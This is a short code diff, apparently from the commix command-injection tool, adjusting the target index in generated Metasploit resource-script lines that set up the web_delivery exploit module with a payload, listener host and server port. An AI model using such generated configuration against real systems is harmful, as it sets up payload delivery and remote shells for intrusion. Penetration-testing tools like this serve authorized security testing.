@@ -441,7 +441,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
 
         with open(output, 'w+') as filewrite:
           filewrite.write("use exploit/multi/script/web_delivery\n"
-                          "set target " + web_delivery + "\n"
+                          "set target " + str(int(web_delivery)-1) + "\n"
                           "set payload " + payload + "\n"
                           "set lhost " + str(settings.LHOST) + "\n"
                           "set srvport " + str(settings.SRVPORT) + "\n"
